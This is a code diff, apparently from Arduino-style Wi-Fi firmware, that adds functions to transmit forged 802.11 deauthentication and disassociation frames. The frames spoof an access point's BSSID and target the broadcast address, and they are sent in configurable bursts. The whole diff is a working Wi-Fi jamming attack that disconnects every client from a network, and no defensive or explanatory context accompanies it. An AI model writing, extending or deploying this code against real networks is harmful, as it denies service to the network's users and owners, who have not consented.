@@ -146,3 +146,39 @@ void wifi_tx_assoc_req(void* sta_mac, void* bssid, const char* ssid) {
 }
 
 
+void wifi_tx_broadcast_deauth(void* bssid, uint16_t reason, int burstCount, int interDelayUs) {
+  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  DeauthFrame frame;
+  memcpy(&frame.source, bssid, 6);
+  memcpy(&frame.access_point, bssid, 6);
+  memcpy(&frame.destination, broadcast, 6);
+  frame.reason = reason;
+  for (int i = 0; i < burstCount; i++) {
+    wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
+    if (interDelayUs > 0) delayMicroseconds(interDelayUs);
+  }
+}
+
+typedef struct __attribute__((packed, aligned(4))) {
+  uint16_t frame_control = 0xA0;      // Disassociation
+  uint16_t duration = 0x0000;
+  uint8_t destination[6];
+  uint8_t source[6];
+  uint8_t bssid[6];
+  const uint16_t sequence_number = 0;
+  uint16_t reason = 0x0008;           // Disassoc due to inactivity by default
+} DisassocFrame;
+
+void wifi_tx_broadcast_disassoc(void* bssid, uint16_t reason, int burstCount, int interDelayUs) {
+  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  DisassocFrame frame = {};
+  memcpy(&frame.source, bssid, 6);
+  memcpy(&frame.bssid, bssid, 6);
+  memcpy(&frame.destination, broadcast, 6);
+  frame.reason = reason;
+  for (int i = 0; i < burstCount; i++) {
+    wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
+    if (interDelayUs > 0) delayMicroseconds(interDelayUs);
+  }
+}
+
